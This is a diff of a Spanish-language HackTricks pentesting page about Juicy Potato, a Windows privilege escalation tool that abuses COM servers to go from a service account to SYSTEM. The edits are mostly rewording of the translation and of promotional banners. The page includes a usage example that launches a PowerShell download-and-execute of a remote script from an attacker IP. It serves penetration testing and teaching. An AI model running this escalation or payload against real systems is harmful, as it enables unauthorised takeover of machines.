@@ -2,11 +2,11 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
@@ -22,7 +22,7 @@
 
 ## Juicy Potato (abusando de los privilegios dorados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
 
-_Una versión azucarada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un poco de jugo, es decir, **otra herramienta de Escalada de Privilegios Local, desde una Cuenta de Servicio de Windows a NT AUTHORITY\SYSTEM**_
+_Una versión azucarada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un poco de jugo, es decir, **otra herramienta de Escalada de Privilegios Local, desde Cuentas de Servicio de Windows a NT AUTHORITY\SYSTEM**_
 
 #### Puedes descargar juicypotato desde [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)
 
@@ -30,11 +30,11 @@ _Una versión azucarada de_ [_RottenPotatoNG_](https://github.com/breenmachine/R
 
 **[Del Readme de juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md):**
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) y sus [variantes](https://github.com/decoder-it/lonelypotato) aprovechan la cadena de escalada de privilegios basada en el servicio [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) teniendo el escucha MiTM en `127.0.0.1:6666` y cuando tienes los privilegios `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisión de la compilación de Windows encontramos una configuración donde `BITS` estaba deshabilitado intencionalmente y el puerto `6666` estaba ocupado.
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) y sus [variantes](https://github.com/decoder-it/lonelypotato) aprovechan la cadena de escalada de privilegios basada en el servicio [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) teniendo el escucha MiTM en `127.0.0.1:6666` y cuando tienes privilegios `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisión de la compilación de Windows encontramos una configuración donde `BITS` estaba deshabilitado intencionalmente y el puerto `6666` estaba ocupado.
 
 Decidimos armar [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Dale la bienvenida a Juicy Potato**.
 
-> Para la teoría, consulta [Rotten Potato - Escalada de Privilegios desde Cuentas de Servicio a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) y sigue la cadena de enlaces y referencias.
+> Para la teoría, ver [Rotten Potato - Escalada de Privilegios desde Cuentas de Servicio a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) y seguir la cadena de enlaces y referencias.
 
 Descubrimos que, además de `BITS`, hay varios servidores COM que podemos abusar. Solo necesitan:
 
@@ -42,24 +42,24 @@ Descubrimos que, además de `BITS`, hay varios servidores COM que podemos abusar
 2. implementar la interfaz `IMarshal`
 3. ejecutarse como un usuario elevado (SYSTEM, Administrador, ...)
 
-Después de algunas pruebas, obtuvimos y probamos una extensa lista de [CLSID's interesantes](http://ohpe.it/juicy-potato/CLSID/) en varias versiones de Windows.
+Después de algunas pruebas obtuvimos y probamos una extensa lista de [CLSID's interesantes](http://ohpe.it/juicy-potato/CLSID/) en varias versiones de Windows.
 
 ### Detalles Jugosos <a href="#juicy-details" id="juicy-details"></a>
 
 JuicyPotato te permite:
 
 * **Objetivo CLSID** _elige cualquier CLSID que desees._ [_Aquí_](http://ohpe.it/juicy-potato/CLSID/) _puedes encontrar la lista organizada por SO._
-* **Puerto de Escucha COM** _define el puerto de escucha COM que prefieras (en lugar del 6666 codificado en el marshalled)_
-* **Dirección IP de Escucha COM** _vincula el servidor a cualquier IP_
+* **Puerto de Escucha COM** _define el puerto de escucha COM que prefieras (en lugar del 6666 codificado en duro)_
+* **Dirección IP de Escucha COM** _vincula el servidor en cualquier IP_
 * **Modo de creación de proceso** _dependiendo de los privilegios del usuario suplantado, puedes elegir entre:_
 * `CreateProcessWithToken` (necesita `SeImpersonate`)
 * `CreateProcessAsUser` (necesita `SeAssignPrimaryToken`)
 * `ambos`
 * **Proceso a lanzar** _lanza un ejecutable o script si la explotación tiene éxito_
 * **Argumento del Proceso** _personaliza los argumentos del proceso lanzado_
-* **Dirección del Servidor RPC** _para un enfoque sigiloso, puedes autenticarte en un servidor RPC externo_
+* **Dirección del Servidor RPC** _para un enfoque sigiloso puedes autenticarte en un servidor RPC externo_
 * **Puerto del Servidor RPC** _útil si deseas autenticarte en un servidor externo y el firewall está bloqueando el puerto `135`..._
-* **Modo de PRUEBA** _principalmente para fines de prueba, es decir, probar CLSIDs. Crea el DCOM e imprime el usuario del token. Ver_ [_aquí para pruebas_](http://ohpe.it/juicy-potato/Test/)
+* **Modo de PRUEBA** _principalmente para propósitos de prueba, es decir, probar CLSIDs. Crea el DCOM e imprime el usuario del token. Ver_ [_aquí para pruebas_](http://ohpe.it/juicy-potato/Test/) 
 
 ### Uso <a href="#usage" id="usage"></a>
 ```
@@ -80,13 +80,13 @@ Optional args:
 ```
 ### Pensamientos finales <a href="#final-thoughts" id="final-thoughts"></a>
 
-**[Del archivo Readme de juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**
+**[Del archivo README de juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**
 
-Si el usuario tiene privilegios `SeImpersonate` o `SeAssignPrimaryToken`, entonces eres **SYSTEM**.
+Si el usuario tiene los privilegios `SeImpersonate` o `SeAssignPrimaryToken`, entonces eres **SYSTEM**.
 
-Es casi imposible prevenir el abuso de todos estos Servidores COM. Podrías pensar en modificar los permisos de estos objetos a través de `DCOMCNFG`, pero buena suerte, esto va a ser desafiante.
+Es casi imposible prevenir el abuso de todos estos Servidores COM. Podrías pensar en modificar los permisos de estos objetos a través de `DCOMCNFG`, pero buena suerte, esto va a ser un desafío.
 
-La solución actual es proteger cuentas sensibles y aplicaciones que se ejecutan bajo las cuentas `* SERVICE`. Detener `DCOM` ciertamente inhibiría este exploit, pero podría tener un impacto serio en el sistema operativo subyacente.
+La solución actual es proteger las cuentas y aplicaciones sensibles que se ejecutan bajo las cuentas `* SERVICE`. Detener `DCOM` ciertamente inhibiría este exploit, pero podría tener un impacto serio en el sistema operativo subyacente.
 
 Desde: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
@@ -107,6 +107,8 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 
 c:\Users\Public>
 ```
+### Powershell rev
+
 ### Powershell rev
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
@@ -136,12 +138,12 @@ Luego descarga [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/mast
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén la [**oficial mercancía de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs al** [**repositorio hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
